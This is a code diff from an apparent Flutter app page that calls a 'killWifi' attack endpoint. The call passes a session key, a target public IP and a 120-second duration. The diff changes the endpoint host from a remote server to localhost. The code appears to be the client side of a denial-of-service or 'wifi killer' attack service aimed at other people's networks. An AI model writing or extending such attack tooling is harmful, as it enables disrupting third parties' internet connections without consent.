@@ -68,7 +68,7 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
   Future<void> _attackTarget() async {
     setState(() => isAttacking = true);
     final url = Uri.parse(
-        "http://zamnode.myserverr.web.id:2065/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
+        "http://127.0.0.1:3143/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
     try {
       final res = await http.get(url);
       if (res.statusCode == 200) {
